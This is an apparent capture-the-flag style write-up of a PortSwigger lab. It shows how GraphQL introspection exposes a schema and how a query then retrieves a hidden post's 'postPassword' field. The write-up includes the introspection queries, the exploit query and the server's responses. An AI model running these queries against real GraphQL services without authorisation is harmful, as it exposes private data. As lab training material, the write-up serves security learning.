# [Accessing private GraphQL posts] — [PortSwigger] — [Apprentice]
**Date:** 2026-08-08
 
---
 
## Vulnerability / core concept
GraphQL Information Disclosure

---


## Payload / key command
During navigation on this web app we can notice `/graphql/v1` endpoint in it. It sends GraphQL query via JSON body to the server to fetch the data. We can notice that the `id`s of posts are sequential without number 3, which probably is the one that we should be looking for in this lab. We need to keep this in mind.

First thing that we should try is to check whether introspection is enabled for production environment. We can use the following JSON body:
```js
{
    "query": "{__schema{queryType{name}}}"
}
```
We get a response for this request, which suggests us that it might be enabled for production. Therefore, we need to test it with a query that will fetch tons of information for us (it is long so I put it in the end of write-up). After using this query we can find almost everything about this GraphQL scheme - now it is time to search for sensitive information. During investigations we can notice some types with interesting names, especially `postPassword`.

Now, we know that we want to fetch data about post with `id=3`, therefore, we need to check whether this web application has a query to fetch a single post by id. To find this, we need to search for `query` in the response to find the following part:
```js
       {
          "kind": "OBJECT",
          "name": "query",
          "description": null,
          "fields": [
            {
              "name": "getBlogPost",
              "description": null,
              "args": [
                {
                  "name": "id",
                  "description": null,
                  "type": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                      "kind": "SCALAR",
                      "name": "Int",
                      "ofType": null
                    }
                  },
                  "defaultValue": null
                }
              ],
              "type": {
                "kind": "OBJECT",
                "name": "BlogPost",
                "ofType": null
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "getAllBlogPosts",
              "description": null,
...
```
As you can see, we found a query that lets us fetch post by their id. Now, all we need to do is use the following query to fetch data of post with id=3:
```js
{"query":"\nquery getBlogSummaries {\n    getBlogPost(id: 3) {\n        image\n        title\n        summary\n        id\n    postPassword\n}\n}","operationName":"getBlogSummaries"}
```
This is the response we got:
```js
{
  "data": {
    "getBlogPost": {
      "image": "/image/blog/posts/10.jpg",
      "title": "I'm A Photoshopped Girl Living In A Photoshopped World",
      "summary": "I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...",
      "id": 3,
      "postPassword": "peky1hyrj51glja26i8q57w62hgp7d9i"
    }
  }
}
```
We can submit this password to the lab and solve it!

P.S.: The script to retrieve full information about GraphQL scheme:
```js
{
  "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } locations } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"
}
```
